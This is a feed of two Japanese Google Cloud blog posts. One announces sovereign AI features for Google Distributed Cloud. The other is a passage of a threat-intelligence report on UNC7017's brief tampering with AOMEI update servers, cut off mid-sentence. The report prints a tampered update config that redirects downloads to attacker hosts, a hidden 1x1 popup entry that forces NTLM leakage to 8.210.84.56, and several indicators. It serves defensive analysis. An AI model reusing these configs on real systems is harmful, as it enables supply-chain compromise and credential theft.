    "id": "1f3929affbbf16d3b045b7e1b95e2832"
    "title": "ソブリン AI の新時代を切り開く: Google Distributed Cloud の最新イノベーション"
    "link": "https://cloud.google.com/blog/ja/topics/hybrid-cloud/new-innovations-in-google-distributed-cloud/"
    "published": "2026-11-02 10:00:00"
    "fetched": "2026-11-02 16:15:20"
    "summary": "<div class=\"block-paragraph\"><p>※この投稿は米国時間 2026 年 10 月 21 日に、Google Cloud blog に<a href=\"https://cloud.google.com/blog/topics/hybrid-cloud/new-innovations-in-google-distributed-cloud?e=48754805&amp;hl=en\">投稿</a>されたものの抄訳です。</p><p>企業におけるエージェント システムは、試験運用から本番環境への移行が急速に進んでいます。しかし、データ主権、防衛、インテリジェンス、重要インフラに関する厳格な規制が適用される組織では、機密データをパブリック クラウドに送信することは多くの場合、選択肢になりません。かといって、切断された境界内に独自の AI スタックを構築するには、数か月を要することもあります。フロンティア モデル、強化されたセキュリティ、高いパフォーマンスが不可欠で、最も機密性の高いデータが存在する場所に直接デプロイすることが求められます。</p><p>Google Distributed Cloud（GDC）エアギャップの最新のイノベーションは、こうした課題に苦慮している組織にとって大きな飛躍であり、もはやこのようなトレードオフを強いられることはありません。Gemini を使用したエンタープライズ検索機能、オープン ウェイト モデルのサポート、すぐに使える ISV アプリケーション、次世代のアクセラレーション インフラストラクチャ、新しいパートナーのサポートがすべて、主権のあるエアギャップ環境に直接デプロイできるようになりました。</p><p>ここでは、ソブリン AI とエンタープライズ検索、次世代インフラストラクチャ、成長を続ける ISV パートナー エコシステムという 3 つの柱にわたってリリースされる主な機能の概要をご紹介します。</p><p><b>GDC 技術スタック: インフラストラクチャ、フロンティア モデル、データ、アプリケーション</b></p><p>GDC の技術スタックは、基盤モデルとオープンモデルの柔軟性、直感的ですぐに使えるユーザー エクスペリエンス、高性能なデータ処理を組み合わせることで、孤立したインフラストラクチャを最新のエージェント イノベーション プラットフォームに変革します。</p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_2n8CczN.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>GDC のアーキテクチャと機能の概要</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph\"><p>では、GDC のイノベーションをご紹介しましょう。</p><ul><li><b>Gemini on GDC エンタープライズ検索:</b> エアギャップのある環境では、アナリストやナレッジ ワーカーが、区分化されたドキュメント、傍受した音声、センサー動画を手作業で選別するのに貴重な時間を費やしています。エージェント システムはこれらのプロセスを効率化できますが、そのような機能を構築するには、多くの場合、数か月にわたるカスタム開発が必要です。<a href=\"https://cloud.google.com/blog/ja/topics/hybrid-cloud/managed-rag-search-inside-the-sovereign-perimeter-gemini-on-gdc-enterprise-search\">Gemini on GDCのエンタープライズ検索機能</a>（プレビュー版）により、組織はすぐに使える会話型インターフェースを利用できるため、膨大なデータ リポジトリに対してほぼ瞬時にクエリ、プロンプト、要約を実行できます。テキストのみのオープンソースの代替手段とは異なり、このマネージド アーキテクチャは、<b>Gemini エンベディング モデルを介してネイティブなマルチモダリティ サポート</b>を提供し、テキスト、音声、動画の各モダリティに対して高スループットのスケーリングと低レイテンシの推論パフォーマンスを組み合わせています。組み込みの検索拡張生成（RAG）により、インデックス作成とインタラクションが主権境界内に厳密に維持されるため、セキュリティを犠牲にすることなく分析情報を迅速に取得できます。</li><li><b>フロンティア モデルとオープン ウェイト モデルの拡張:</b> Google Cloud は、<b>Gemini のようなフロンティア モデルをエアギャップ デプロイメントに導入した最初のハイパースケーラー</b>の一つです。GDC エアギャップで一般提供が開始された <b>Gemini 3.5 Flash</b> は、超低レイテンシの推論、マルチモーダル理解、長いコンテキストの処理を、エアギャップの境界内で完全に実現します。これにより、ユーザーはレポートから画像、録音まで、大量の現場情報を迅速に処理できます。また、<b>Gemma</b> や <b>Mistral</b> などの主要なオープンモデルのサポートも開始されます。これにより、アーキテクチャとワークロードの選択肢が広がり、管理された同じプラットフォーム上で各ワークロードに適切なモデルを柔軟に適合させることができます。</li></ul><p><b>GDC を支える次世代 IaaS</b></p><p>最新のエージェント システムとメモリを大量に消費するエンタープライズ ワークロードを同じインフラストラクチャで実行するには、妥協のない基盤が必要です。GDC エアギャップは、コンピューティングからネットワーキング、セキュリティにわたって新しい高度な Infrastructure as a Service（IaaS）スタックを備えており、AI ワークロードと従来のワークロードを並行して実行し、必要なパフォーマンスと保護を実現できます。</p><ul><li><b>次世代の高性能エージェント インフラストラクチャ:</b> <b>NVIDIA Blackwell Ultra アーキテクチャを採用した NVIDIA HGX B300 システム</b>が、GDC エアギャップで一般提供されました。これにより、Gemini やオープンモデル、そしてそれらを基盤とするエージェントを本番環境規模で提供するためのコンピューティングを、ローカル環境で利用できるようになります。<b>VM あたりのネットワーク帯域幅が最大 32 Gbps</b> になった VM ネットワーキング（25 Gbps から増加）と組み合わせることで、GPU へのデータ転送が高速化され、推論パイプラインにおけるボトルネックが軽減されます。</li><li><b>復元力のあるエンタープライズ グレードのネットワーキング:</b> フルマネージドの <b>Cloud DNS が GDC で一般提供</b>されたことで、プラットフォーム チームは、使い慣れた Kubernetes API やコマンドラインで DNS レコードを管理できるようになりました。エアギャップ内にデプロイ、パッチ適用、メンテナンスを行うサードパーティの DNS インフラストラクチャは必要ありません。また、ハードウェア オフロードされた <b>IPsec 暗号化により、最大 100 Gbps でノード間トラフィックを保護</b>し、アプリケーションから CPU を消費することなく、転送中の暗号化要件を満たすことが可能になります。</li><li><b>Elastic を活用した SecOps の実現:</b> エージェント ワークロードが拡大するにつれ、分散環境を保護するためにマシンスピードのセキュリティが求められます。<a href=\"https://www.elastic.co/blog/elastic-security-integration-with-google-distributed-cloud\" target=\"_blank\"><b>Elastic Security</b></a> との緊密なインテグレーションにより、Google は GDC エアギャップでの脅威の検出と対応（SIEM と EDR）をモダナイズしています。Elastic Security と GDC エアギャップを組み合わせることで、ケース管理の自動化、行動分析、エージェント駆動型のテレメトリ相関分析が可能となり、平均対応時間（MTTR）を短縮できます。</li></ul><p><b>ソブリン ISV パートナー エコシステムの拡大</b></p><p>インフラストラクチャだけでなく、チームがすでに使い慣れているデータ プラットフォーム、デベロッパー ツール、コラボレーション アプリもミッション達成に欠かせない要素です。そのため、Google は、使い慣れたツールをそのまま使用して AI を導入できるように、GDC でネイティブに実行できるソフトウェアを増やしています。このたび、GDC パートナーを拡充するため、<b>Teradata、Solo.io、Mattermost</b> などの独立系ソフトウェア ベンダー（ISV）をマーケットプレイスに迎えました。</p><ul><li><a href=\"https://www.teradata.com/insights/ai-and-machine-learning/analytics-meets-sovereign-infrastructure\" target=\"_blank\"><b>Teradata</b></a> は、業界標準のエンタープライズ データ分析とウェアハウス インテリジェンスを分散エッジに拡張します。これにより、複雑な分析パイプラインをローカル AI 推論のすぐ隣で実行し、データを境界外に移動することなく、得られた分析情報に基づいて行動できます。</li></ul><p>「規制が厳しく、エアギャップ環境を抱える企業は、生成 AI がもたらす変革力を活用したいと考えていますが、データのプライバシーや分析の厳密性を犠牲にすることはできません。Teradata を Google Distributed Cloud に導入することで、共通のお客様は、データが存在するその場所で複雑な分析ワークロードと AI 推論を実行できるようになります。Google Cloud とともに、ソブリン クラウド インフラストラクチャとエンタープライズ グレードのインテリジェンスの間にある障壁を取り除いていきます。」- <b>Teradata</b>、最高製品責任者、Sumeet Arora 氏</p><ul><li><a href=\"https://www.solo.io/blog/from-sovereign-models-to-sovereign-agents-kagent-and-agentgateway-on-google-distributed-cloud\" target=\"_blank\"><b>Solo.io</b></a> は、API 管理、サービス メッシュ、kagent や agentgateway などのエージェント ネットワーキングをソブリンのデプロイにおいて提供します。これにより、分離されたクラスタ間でマイクロサービスや AI エージェントを安全に接続して管理できます。これには、各エージェントがアクセスできるツールや他のエージェントも含まれます。</li><li><a href=\"https://docs.mattermost.com/\" target=\"_blank\"><b>Mattermost</b></a> は、防衛および公共部門のチームに安全なコラボレーションとミッション クリティカルな運用ワークフローを提供します。これにより、GDC でローカルに実行されるモデルを使用した AI を活用した要約や翻訳など、エアギャップ内で完全にリアルタイムで調整することが可能になります。</li></ul><p><b>ソブリン クラウドの未来を築く</b></p><p>これらの機能を活用すれば、ソブリンが AI 活用に向けた取り組みの足かせとなることはもうありません。GDC は、Gemini とオープンウェイト モデル、マルチモーダル エンタープライズ検索、高性能インフラストラクチャ、組み込みのセキュリティ、成長を続ける ISV エコシステムを、エアギャップ境界内に統合することで、コンプライアンス、セキュリティ、制御を維持しながら、極めて機密性の高いデータを行動につながるインサイトに変換できるようにします。</p><p><b>使ってみる</b></p><ul><li>Gemini on GDC のエンタープライズ検索に関する<a href=\"https://cloud.google.com/blog/ja/topics/hybrid-cloud/managed-rag-search-inside-the-sovereign-perimeter-gemini-on-gdc-enterprise-search\">技術解説</a>をご覧ください。</li><li><a href=\"https://docs.cloud.google.com/distributed-cloud/hosted/docs/latest/gdcag\">GDC エアギャップのドキュメント</a>をご覧ください。</li><li>デモの日程調整は GDC 担当者にご相談ください。</li></ul><p><b><i>-</i></b> <i>Google Distributed Cloud、プロダクト管理およびサプライ チェーン担当バイス プレジデント、</i><b><i>Muninder Sambi</i></b></p></div>"
  "ae37afbe688f1ca64c7ca9f5cd6e1ead":
    "id": "ae37afbe688f1ca64c7ca9f5cd6e1ead"
    "title": "一時的に行われるサプライ チェーン改ざんの調査"
    "link": "https://cloud.google.com/blog/ja/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering/"
    "published": "2026-11-02 09:00:00"
    "fetched": "2026-11-02 16:15:20"
    "summary": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">※この投稿は米国時間 2026 年 10 月 16 日に、Google Cloud blog に</span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">投稿</span></a><span style=\"vertical-align: baseline;\">されたものの抄訳です。</span></p>\n<p><span style=\"vertical-align: baseline;\">執筆者: Tyler McLellan</span></p>\n<h4><strong style=\"vertical-align: baseline;\">はじめに</strong></h4>\n<p><span style=\"vertical-align: baseline;\">Google Threat Intelligence Group（GTIG）と Mandiant は、2026 年 4 月から 2026 年 7 月にかけて、AOMEI Technology のアップデート インフラストラクチャを標的としたソフトウェア サプライ チェーン侵害キャンペーンを調査しました。脅威アクターは、AOMEI の配信元サーバーに対して、単発的な構成改ざんを繰り返し行っていました。改ざん時間枠が有効だったのはわずか 5～10 分間で、その後は正規のバージョンに戻されていました。ソフトウェア サプライ チェーンの侵害が、このように非常に短い時間枠で実行され、従来の特定の時点におけるトリアージや自動ファイル スキャンを事実上回避した事例は、今回が初めてです。</span></p>\n<p><span style=\"vertical-align: baseline;\">このキャンペーンでは、新たに追跡された CROSSROAD ダウンローダと SHINYROAD バックドアを含む、多段階のペイロード チェーンが配信されました。この脅威アクターは、トレードクラフトを繰り返し変更し、ステージング インフラストラクチャをクラウド プロバイダから専用ドメインや正規のクラウド ストレージへと移行させていました。このように進化するステージング構成により、防御側がインフラベースの効果的なブロックやネットワーク制御を確立することが特に困難になっています。Google は、この活動を UNC7017 として追跡している脅威クラスタによるものと特定しています。</span></p>\n<p><span style=\"vertical-align: baseline;\">利用可能なテレメトリーに基づくと、被害を受けた組織は、オーストラリア、ブラジル、インド、パキスタン、ポルトガル、シンガポール、南アフリカ、スペイン、スイス、トルコ、米国における IT サービス、通信、高等教育機関および関連機関など、多岐にわたる分野に及んでいます。とはいえ、このキャンペーンは、脅威アクターによる改ざん期間中にアップデート配信サーバーをポーリングしたすべてのシステムにマルウェアを配信しようとしたため、被害の発生傾向は無差別なものであり、Google が直接特定した組織よりも広範囲に及んでいる可能性があります。</span></p>\n<p><span style=\"vertical-align: baseline;\">このキャンペーンは、Zoho Corporation の一部門である ManageEngine Threat Analysis Lab（METAL）との共同調査によって最初に特定されました。METAL のエンドポイント検出および対応（EDR）テレメトリーが、5 月下旬の段階で複数の顧客環境におけるこの活動を検知していました。共通の顧客基盤およびより広範なソフトウェア エコシステムの安全確保に向け、積極的にテレメトリーを共有し、継続的にご協力いただいている METAL チームに感謝いたします。この共同作業の後、GTIG は影響を受ける可能性のある組織に通知し、技術的な調査結果を AOMEI Technology と共有しました。AOMEI は、配信サーバーを保護するための是正措置を講じたと報告しています。METAL によるこのキャンペーンの分析は、同社の</span><a href=\"https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ブログ投稿</span></a><span style=\"vertical-align: baseline;\">でご覧いただけます。</span></p>\n<h4><strong style=\"vertical-align: baseline;\">AOMEI のアップデートと通知システムの仕組み</strong></h4>\n<p><span style=\"vertical-align: baseline;\">AOMEI Backupper はデータ バックアップ、ディスク クローン作成、障害復旧機能を提供し、AnyViewer はリモート デスクトップ アクセスやサポートを実現します。これらの製品のユーザーは、ABMarket のアップデート フローと、それに関連するバックグラウンド サービス（</span><code style=\"vertical-align: baseline;\">Backupper.exe</code><span style=\"vertical-align: baseline;\"> と </span><code style=\"vertical-align: baseline;\">ABNotify.exe</code><span style=\"vertical-align: baseline;\">）を利用しています。これらのサービスは、アップデート通知やプロモーションのポップアップを取得するため、HTTPS 経由でリモート エンドポイントを定期的にポーリングします。</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"AOMEI Update Mechanism\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_1_AOMEI_Update_Mechanism.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>図 1: AOMEI のアップデート メカニズム</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">アップデート構成</strong><span style=\"vertical-align: baseline;\">（</span><code style=\"vertical-align: baseline;\">down_html.ini</code><span style=\"vertical-align: baseline;\">）: ソフトウェアは、</span><code style=\"vertical-align: baseline;\">https://www2.aomeisoftware.com/download/abpopup/down_html.ini</code><span style=\"vertical-align: baseline;\"> に HTTPS リクエストを定期的に送信します。このファイルには、バージョン番号、想定されるアップデート パッケージの MD5 ハッシュ、クライアントが </span><code style=\"vertical-align: baseline;\">upgrade-now.zip</code><span style=\"vertical-align: baseline;\"> をダウンロードする URL が含まれています。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>通知構成</strong>（</span><code style=\"vertical-align: baseline;\">Notifycfg.ini</code><span style=\"vertical-align: baseline;\">）: ソフトウェアは </span><code style=\"vertical-align: baseline;\">https://account.aomeitech.com/Notifycfg.ini</code><span style=\"vertical-align: baseline;\"> にアクセスします。このファイルは、ローカル通知プロセス（</span><code style=\"vertical-align: baseline;\">ABNotify.exe</code><span style=\"vertical-align: baseline;\">）に対して表示するメッセージを指示するほか、ソフトウェアのローカル ディレクトリ内にある実行対象のコマンドやプログラムを指定します。</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">通常、これらのファイルは、AOMEI 独自のドメイン（</span><code style=\"vertical-align: baseline;\">www2.aomeisoftware.com</code><span style=\"vertical-align: baseline;\">）でホストされている公式ファイルをダウンロードするようクライアントに指示します。</span></p>\n<h4><strong style=\"vertical-align: baseline;\">キャンペーンの概要</strong></h4>\n<p><span style=\"vertical-align: baseline;\">GTIG と METAL のテレメトリーによると、UNC7017 はベンダーの配布サーバー上で持続的かつ固定的な変更を維持するのではなく、構成の改ざんを短時間で繰り返し行っていました。2026 年には複数の改ざん期間を確認したほか、4 月下旬からは実際の運用環境で関連するマルウェア サンプルが観測されています。しかし、これらの期間が短かったことを考えると、キャンペーン全体を通じて、Mandiant の可視性の範囲外でさらなる改ざんが行われていた可能性が高いと言えます。アクティブな時間帯にアップデートを確認したシステムは悪意のある指示を受け取り、その前後に確認したシステムはクリーンな正規のファイルを受け取りました。</span></p>\n<p><span style=\"vertical-align: baseline;\">この短い改ざん期間中、脅威アクターはアップデート サーバー上のアップデート設定ファイルを変更し、ソフトウェアが正規のアップデートではなく、攻撃者が制御するサーバーから悪意のある ZIP パッケージをダウンロードするようにリダイレクトしました。また、脅威アクターは、アップデート サーバー上の通知設定ファイルを改ざんして、ソフトウェアの自動通知サービスを悪用し、ダウンロードしたマルウェアをローカルで即座に強制実行させました。脅威アクターによる変更が有効な間にユーザーのアプリケーションがアップデートを確認すると、アプリケーションはトロイの木馬化されたアップデートをダウンロードし、マルウェアを実行します。</span></p>\n<p><span style=\"vertical-align: baseline;\">改ざんされた構成ファイルが有効な場合、脅威アクターはクライアントに対して、CROSSROAD を含む武器化された ZIP アーカイブをダウンロードするよう指示しました。CROSSROAD は、環境の検証とセカンダリ コンポーネントのステージングを担う初期ダウンローダです。その後、CROSSROAD はタスク スケジューラによる永続化を確立して SHINYROAD をデプロイしました。SHINYROAD は、トロイの木馬化された管理ユーティリティを介して配信されるモジュール型バックドア フレームワークで、隠蔽されたコマンド＆コントロールを可能にします。</span></p>\n<p><strong style=\"vertical-align: baseline;\">短時間のサプライ チェーン改ざん</strong></p>\n<p><span style=\"vertical-align: baseline;\">UNC7017 の運用セキュリティにおける決定的な特徴は、短時間かつ一時的なサーバー変更に頼っている点です。直接観測されたすべての攻撃の波において、攻撃者は AOMEI のアップデート サーバーに悪意のある構成を常駐させないようにしていました。</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">5 月 28 日: 10 分間の影響時間枠（05:40 ～ 05:50 UTC）</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">7 月 16 日: 6 分間の影響時間枠（UTC 8:33 ～ 8:39）</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">7 月 20 日: 5 分間の影響時間枠（10:35 ～ 10:40 UTC）</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">各時間枠の終了時に、UNC7017 は down_html.ini と Notifycfg.ini の両方を正規の内容に戻しました。これにより、インシデント後のベンダー監査が妨げられ、ネットワーク防御者が悪意のあるサーバーのライブ応答を取得できる時間が最小限に抑えられ、被害はその数分間にアップデートをポーリングしたクライアントだけに限定されます。</span></p>\n<p><strong style=\"vertical-align: baseline;\">ネイティブ アップデート ロジックの武器化: down_html.ini と構成ファイルの肥大化</strong></p>\n<p><span style=\"vertical-align: baseline;\">UNC7017 は、ソフトウェアの脆弱性に頼らずにエンドポイントを侵害するために、AOMEI クライアントの正規のアップデートとポップアップ レンダリング ワークフローを悪用しました。デフォルトでは、クライアントはアップデート アーカイブを Tmphtml ディレクトリにダウンロードし、ローカルの html/ ディレクトリに解凍して、2 つのリモート構成ファイル（down_html.ini と Notifycfg.ini）から指示を処理します。</span></p>\n<p><span style=\"vertical-align: baseline;\">AOMEI クライアントが武器化された upgrade-now.zip アーカイブを確実に受け入れて解凍するように、UNC7017 は改ざん時間枠ごとにマイナー ビルド バージョン（「thrid」）を段階的にインクリメントし、down_html.ini の想定される MD5 チェックサムを更新しました。</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>[Date]\n-Url=https://www2.aomeisoftware.com/download/abpopup/upgrade-now.zip\n+Url=https://promotion.storage-data.com/download/abpopup/upgrade-now.zip\nName=upgrade-now\n[Version]\nmaj=8\nmin=2\n-thrid=5\n+thrid=6\n[MD5]\n-Val=EE89C99F3753231771170F5D9CBBAE1E\n+Val=31323E7E738230FA6A8DEEF2B7894666</code></pre>\n<p style=\"text-align: center;\"><span style=\"font-style: italic; vertical-align: baseline;\">図 2: 7 月 16 日に行われた down_html.ini の改ざん。ダウンロードを promotion.storage-data.com にリダイレクトし、バージョンをインクリメント（thrid=6）して MD5 ハッシュを同期。</span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">7 月 16 日の 6 分間の時間枠（ウィンドウ）において、UNC7017 は Notifycfg.ini（SHA256: d2f9ef2429312667f0512504b6a19ba4a9cc5514f1b2933923dd42f75a1c5934）も同時に改ざんし、[dummy_XXXXXX] という名称の重複する設定セクションを 35,000 行以上挿入しました。この極端な構成ファイルの肥大化は、標準のクライアント バージョン チェックをオーバーライドして、インストールされているバージョンに関わらず強制的にアップデートを発生させ、ローカルの html/ ディレクトリから解凍された CROSSROAD ドロッパー（upgrade-now.exe）を即座に実行するように設計されていました。</span></p>\n<p><strong style=\"vertical-align: baseline;\">インフラストラクチャの移行</strong></p>\n<p><span style=\"vertical-align: baseline;\">2026 年 4 月から 7 月にかけて、UNC7017 はステージングと配信のインフラストラクチャをパブリック クラウド バケットと脅威アクターが管理するなりすましドメインの間で切り替えました。これは、ペイロードの配信をテストし、正規のベンダー トラフィックを装うためと考えられます。</span></p>\n<p><strong style=\"font-style: italic; vertical-align: baseline;\">インフラストラクチャの移行</strong></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">初期のクラウド ステージング（2026 年 4 月～5 月）:</strong><span style=\"vertical-align: baseline;\"> 初期の CROSSROAD ペイロード（5 月 20 日に観測された </span><code style=\"vertical-align: baseline;\">upgrade-now.exe</code><span style=\"vertical-align: baseline;\">）は、Alibaba Cloud Object Storage（</span><code style=\"vertical-align: baseline;\">serv.oss-cn-hongkong.aliyuncs.com</code><span style=\"vertical-align: baseline;\">）を利用していました。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">専用ドメイン インフラストラクチャ（2026 年 7 月 1 日～7 日）:</strong><span style=\"vertical-align: baseline;\"> 脅威アクターは、ベンダー名に似せた専用ドメイン（</span><code style=\"vertical-align: baseline;\">storage-data.com</code><span style=\"vertical-align: baseline;\">、</span><code style=\"vertical-align: baseline;\">promotion.storage-data.com</code><span style=\"vertical-align: baseline;\">、</span><code style=\"vertical-align: baseline;\">aomei.storage-data.com</code><span style=\"vertical-align: baseline;\">）に移行しました。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">ハイブリッド クラウド配信の分割（2026 年 7 月 20 日）:</strong><span style=\"vertical-align: baseline;\"> 7 月 20 日の 5 分間の時間枠で、脅威アクターは </span><code style=\"vertical-align: baseline;\">down_html.ini</code><span style=\"vertical-align: baseline;\"> を変更し、クライアントの初期ダウンロードを </span><code style=\"vertical-align: baseline;\">storage-data.com</code><span style=\"vertical-align: baseline;\"> ではなく、公開されている Google Cloud Storage バケット（</span><code style=\"vertical-align: baseline;\">storage.googleapis.com/aomeiupdate/upgrade-now.zip</code><span style=\"vertical-align: baseline;\">）に誘導しました。この戦術的な転換により、初期ダウンロードは新規登録ドメイン（NRD）をブロックする企業のプロキシ フィルタをバイパスできるようになりました。一方、実行された CROSSROAD ローダは、引き続き </span><code style=\"vertical-align: baseline;\">storage-data.com</code><span style=\"vertical-align: baseline;\"> を利用して二次ペイロードの取得と C2 通信を行いました。</span></p>\n</li>\n</ol></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>[Date]\nUrl=https://storage.googleapis.com/aomeiupdate/upgrade-now.zip\nName=upgrade-now\n[Version]\nmaj=8\nmin=2\nthrid=7\n[MD5]\nVal=BF73C4391B58CA95220CE3AE03F66DCF</code></pre>\n<p style=\"text-align: center;\"><span style=\"font-style: italic; vertical-align: baseline;\">図 3: 7 月 20 日に行われた down_html.ini の改ざん。Google Cloud Storage（thrid=7）を利用して新規登録ドメイン（NRD）の境界ブロックを回避。</span></p></div>\n<div class=\"block-paragraph_advanced\"><h4><strong style=\"vertical-align: baseline;\">WebDAV NTLM 認証情報の強制</strong></h4>\n<p><span style=\"vertical-align: baseline;\">7 月 20 日、UNC7017 は Notifycfg.ini 内に二次的な悪用ベクトルを組み込みました。改ざんされる前、Notifycfg.ini には「World Cup Deals」を宣伝する正規の 400x380 のプロモーション バナーが表示されていました。脅威アクターは、このバナーを、最大実行優先度（Priority=9999）が割り当てられた非表示の 1×1 ピクセル ウィンドウ（Width=1、Height=1）に置き換え、ユニバーサル命名規則（UNC）WebDAV パスを介してリモート HTML ファイルをレンダリングするようクライアントに指示しました。</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>[PopWindow1]\nID=307\nTitle=20260408-AB Flash Sale (All Lang 不含EN)\nAddress=\"file://8.210.84.56/DavWWWRoot/campaign/24hour-flash-sale.html\"\nWidth=1\nHeight=1\nPriority=9999\n</code></pre>\n<p style=\"text-align: center;\"><span style=\"font-style: italic; vertical-align: baseline;\">図 4: </span><code style=\"font-style: italic; vertical-align: baseline;\">Notifycfg.ini</code><span style=\"font-style: italic; vertical-align: baseline;\"> への非表示の 1x1 ポップアップ ウィンドウの実装により、</span><code style=\"font-style: italic; vertical-align: baseline;\">8.210.84.56</code><span style=\"font-style: italic; vertical-align: baseline;\"> への WebDAV / NTLM 認証を強制する 7 月 20 日の悪意のある構成。</span></p>\n<p> </p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">UNC7017 は、AOMEI クライアントに WebDAV（</span><code style=\"vertical-align: baseline;\">DavWWWRoot</code><span style=\"vertical-align: baseline;\">）経由でリモートの </span><code style=\"vertical-align: baseline;\">file://</code><span style=\"vertical-align: baseline;\"> リソースをリクエストさせることで、ユーザーに気付かれることなく、エンドポイントから NetNTLMv2 認証ハッシュを攻撃者が制御する IP アドレス（</span><code style=\"vertical-align: baseline;\">8.210.84.56</code><span style=\"vertical-align: baseline;\">）に送信させる、ステルスな認証情報収集メカニズムを構築しました。</span></p>\n<p><strong style=\"vertical-align: baseline;\">マルウェアの配信と侵入後の活動用ツール</strong></p>\n<p><span style=\"vertical-align: baseline;\">UNC7017 は、一連の攻撃キャンペーンを通じて、カスタム ローダーと商用 / オープンソースの侵入後活動用フレームワークで構成される一貫した攻撃ツールチェーンをデプロイしました。</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">タイムストンプによる防御回避: </strong><span style=\"vertical-align: baseline;\">5 月 20 日に VirusTotal に提出された初期の CROSSROAD ドロッパー（upgrade-now.exe）の分析により、脅威アクターが PE コンパイルのタイムスタンプを操作して、2024 年の構築日を偽装し、フォレンジック タイムライン分析を複雑にしようとしていたことが判明しました。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">改変された Radmin Server バックドア: </strong><span style=\"vertical-align: baseline;\">5 月 28 日の攻撃では、html/ ディレクトリにドロップされた署名のないローダが rsetup64.exe /intsetup を実行し、商用リモート管理ツール Radmin Server の改変版をサイレント インストールして、永続的なリモート アクセスを確立しました。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Adaptix C2 インテグレーション:</strong><span style=\"vertical-align: baseline;\"> 少なくとも 2026 年 7 月上旬以降、脅威アクターが storage-data.com インフラストラクチャ全体に Adaptix C2 フレームワークをデプロイしていることが確認されています。</span></p>\n</li>\n</ul>\n<p><strong style=\"font-style: italic; vertical-align: baseline;\">プライマリ ダウンローダ: CROSSROADDownloader</strong></p>\n<p><span style=\"vertical-align: baseline;\">プライマリ ステージ 2 ダウンローダ（</span><code style=\"vertical-align: baseline;\">upgrade-now.exe</code><span style=\"vertical-align: baseline;\">、SHA256: </span><code style=\"vertical-align: baseline;\">9a58e8f49edf5644e5728f74cf36f560d3d486fa51db4db69d927963c7aca450</code><span style=\"vertical-align: baseline;\">）は、C 言語で記述された 64 ビット Windows 実行可能ファイルで、GTIG によって </span><strong style=\"vertical-align: baseline;\">CROSSROAD</strong><span style=\"vertical-align: baseline;\"> マルウェア ファミリーとして追跡されています。</span><code style=\"vertical-align: baseline;\">upgrade-now.zip</code><span style=\"vertical-align: baseline;\"> 内で配信される CROSSROAD は、環境の検証、アクティブなエンドポイントのクリーンアップ、セカンダリ ペイロード バンドルのステージング、ステージ 3 バックドア スイートに対するタスク スケジューラでの永続化を担います。</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">パスの検証:</strong><span style=\"vertical-align: baseline;\"> CROSSROAD は、構成ルーチンの一環として、ファイルパスに部分文字列 </span><code style=\"vertical-align: baseline;\">AOMEI</code><span style=\"vertical-align: baseline;\"> が含まれているかどうかを確認します。部分文字列が存在しない場合は自己削除ルーチンを開始しますが、処理は中断せず、バックグラウンドでの構成クリーンアップとダウンローダ ルーチンの両方をそのまま続行します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">実行ガードレール:</strong><span style=\"vertical-align: baseline;\"> CROSSROAD は、セカンダリ ダウンロードに進む前に、2 つの主要なチェックを実施します。</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">地理位置情報の確認:</strong><span style=\"vertical-align: baseline;\"> カスタム ユーザー 